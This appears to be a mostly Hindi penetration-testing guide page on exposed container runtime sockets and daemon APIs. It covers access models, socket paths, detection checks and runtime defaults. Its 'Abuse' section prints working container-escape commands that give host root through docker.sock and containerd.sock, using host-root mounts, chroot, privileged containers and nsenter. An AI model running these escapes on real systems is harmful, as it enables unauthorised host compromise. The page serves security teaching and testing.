# Runtime API और Daemon एक्सपोज़र

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

कई वास्तविक container compromieses namespace escape से शुरू ही नहीं होते। वे runtime control plane तक पहुंच से शुरू होते हैं। अगर कोई workload माउंट किए गए Unix socket या एक्सपोज़ किए गए TCP listener के माध्यम से `dockerd`, `containerd`, CRI-O, Podman, या kubelet से बात कर सकता है, तो attacker संभवतः बेहतर privileges वाला नया container request कर सकता है, host filesystem mount कर सकता है, host namespaces में जुड़ सकता है, या संवेदनशील node जानकारी प्राप्त कर सकता है। ऐसे मामलों में runtime API असली सुरक्षा सीमा होती है, और इसे compromise करना व्यावहारिक रूप से host compromise के जितना ही खतरनाक है।

इसी वजह से runtime socket exposure को kernel protections से अलग दस्तावेज़ित किया जाना चाहिए। एक container जिसमें सामान्य seccomp, capabilities, और MAC confinement हैं, फिर भी host compromise से केवल एक API कॉल दूर हो सकता है यदि `/var/run/docker.sock` या `/run/containerd/containerd.sock` उसके अंदर mount किया गया हो। वर्तमान container का kernel isolation बिलकुल जैसा डिज़ाइन किया गया है वैसा ही काम कर रहा हो सकता है जबकि runtime management plane पूरी तरह से एक्सपोज़्ड रह सकता है।

## Daemon Access Models

Docker Engine पारंपरिक रूप से अपना privileged API लोकल Unix socket `unix:///var/run/docker.sock` पर एक्सपोज़ करता है। ऐतिहासिक रूप से इसे TCP listeners जैसे `tcp://0.0.0.0:2375` पर या `2376` पर TLS-protected listener के माध्यम से रिमोटली भी एक्सपोज़ किया गया है। मजबूत TLS और client authentication के बिना daemon को रिमोटली एक्सपोज़ करना प्रभावी रूप से Docker API को एक remote root interface बना देता है।

containerd, CRI-O, Podman, और kubelet भी इसी तरह के उच्च-प्रभाव वाले सतहों को एक्सपोज़ करते हैं। नाम और workflows भिन्न हो सकते हैं, लेकिन लॉजिक अलग नहीं होती। अगर interface caller को workloads बनाने, host paths mount करने, credentials प्राप्त करने, या running containers को बदलने देता है, तो वह interface एक privileged management channel है और उसे उसी अनुसार माना जाना चाहिए।

जाँच करने लायक सामान्य लोकल paths हैं:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Older or more specialized stacks may also expose endpoints such as `dockershim.sock`, `frakti.sock`, or `rktlet.sock`. Those are less common in modern environments, but when encountered they should be treated with the same caution because they represent runtime-control surfaces rather than ordinary application sockets.

## सुरक्षित रिमोट एक्सेस

अगर किसी daemon को local socket से बाहर expose करना ही पड़े, तो connection को TLS से सुरक्षित किया जाना चाहिए और बेहतर होगा कि mutual authentication भी हो ताकि daemon client को verify करे और client daemon को verify करे। सुविधा के लिए Docker daemon को plain HTTP पर खोलने की पुरानी आदत container administration में सबसे खतरनाक गलतियों में से एक है, क्योंकि API surface इतना शक्तिशाली है कि सीधे privileged containers बना सकता है।

The historical Docker configuration pattern looked like:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd-आधारित होस्ट्स पर, daemon संचार `fd://` के रूप में भी दिख सकता है, जिसका अर्थ है कि प्रोसेस स्वयं सीधे बाइंड करने के बजाय systemd से पहले से खोले गए socket को inherit कर लेता है। महत्वपूर्ण सबक सटीक सिंटैक्स नहीं बल्कि सुरक्षा निहितार्थ है। जिस क्षण daemon कड़ाई से permissioned स्थानीय socket से परे सुनना शुरू करता है, transport security और client authentication वैकल्पिक हार्डनिंग नहीं बल्कि अनिवार्य हो जाते हैं।

## Abuse

यदि कोई runtime socket मौजूद है, तो पुष्टि करें कि वह कौन सा है, क्या कोई compatible client मौजूद है, और क्या raw HTTP या gRPC access संभव है:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
ये commands इसलिए उपयोगी हैं क्योंकि वे यह पहचानते हैं कि कोई path dead है, socket mounted है पर inaccessible है, या कोई API live और privileged है। यदि client सफल होता है, तो अगला सवाल यह है कि क्या API host bind mount या host namespace sharing के साथ नया container लॉन्च कर सकता है।

### Full Example: Docker Socket To Host Root

यदि `docker.sock` पहुँच योग्य है, तो पारंपरिक escape यह है कि एक नया container शुरू किया जाए जो host root filesystem को mount करे और फिर `chroot` करके उसमें जाए:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
यह Docker daemon के माध्यम से प्रत्यक्ष host-root execution प्रदान करता है। प्रभाव केवल file reads तक सीमित नहीं है। एक बार नए container के अंदर पहुँचने पर, attacker host files में बदलाव कर सकता है, credentials एकत्र कर सकता है, persistence स्थापित कर सकता है, या अतिरिक्त privileged workloads शुरू कर सकता है।

### पूर्ण उदाहरण: Docker Socket To Host Namespaces

यदि attacker filesystem-only access के बजाय namespace entry को प्राथमिकता देता है:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
यह रास्ता वर्तमान container को exploit करने के बजाय runtime से स्पष्ट host-namespace exposure वाले एक नए container को बनाने के लिए कहकर host तक पहुँचता है।

### पूर्ण उदाहरण: containerd Socket

माउंट किया गया `containerd` socket आमतौर पर उतना ही खतरनाक होता है:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
प्रभाव फिर से host compromise है। भले ही Docker-specific tooling अनुपस्थित हो, कोई अन्य runtime API अभी भी वही प्रशासनिक शक्ति प्रदान कर सकता है।

## जाँच

इन जाँचों का उद्देश्य यह पता लगाना है कि क्या container किसी ऐसे management plane तक पहुँच सकता है जो trust boundary के बाहर ही रहना चाहिए था।
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
What is interesting here:

- माउंट किया हुआ रनटाइम सॉकेट अक्सर सिर्फ सूचना के खुलासे से ज़्यादा, एक प्रत्यक्ष प्रशासनिक साधन होता है।
- TLS के बिना `2375` पर TCP listener को रिमोट-समझौता स्थिति माना जाना चाहिए।
- `DOCKER_HOST` जैसे environment variables अक्सर दर्शाते हैं कि वर्कलोड जानबूझकर host runtime से बात करने के लिए डिज़ाइन किया गया था।

## रनटाइम डिफ़ॉल्ट्स

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` स्थानीय socket पर सुनता है और daemon आम तौर पर root के रूप में चलता है | `/var/run/docker.sock` को माउंट करना, `tcp://...:2375` एक्सपोज़ करना, `2376` पर TLS कमजोर या अनुपस्थित होना |
| Podman | Daemonless CLI by default | साधारण स्थानीय उपयोग के लिए किसी लंबे समय तक चलने वाले privileged daemon की आवश्यकता नहीं है; जब `podman system service` सक्षम हो तो API sockets फिर भी एक्सपोज़ हो सकते हैं | `podman.sock` को एक्सपोज़ करना, सर्विस को व्यापक रूप से चलाना, rootful API उपयोग |
| containerd | Local privileged socket | प्रशासनिक API स्थानीय socket के माध्यम से एक्सपोज़ होता है और आमतौर पर उच्च-स्तरीय टूलिंग द्वारा उपयोग किया जाता है | `containerd.sock` को माउंट करना, व्यापक `ctr` या `nerdctl` एक्सेस, प्रिविलेज्ड namespaces को एक्सपोज़ करना |
| CRI-O | Local privileged socket | CRI endpoint नोड-लोकल भरोसेमंद कंपोनेंट्स के लिए इरादा है | `crio.sock` को माउंट करना, CRI endpoint को अनविश्वसनीय वर्कलोड्स के लिए एक्सपोज़ करना |
| Kubernetes kubelet | Node-local management API | Kubelet को Pods से व्यापक रूप से पहुंच योग्य नहीं होना चाहिए; पहुँच authn/authz पर निर्भर करते हुए pod state, credentials, और execution सुविधाओं को एक्सपोज़ कर सकती है | kubelet sockets या certs को माउंट करना, कमजोर kubelet auth, host networking के साथ पहुंच योग्य kubelet endpoint |
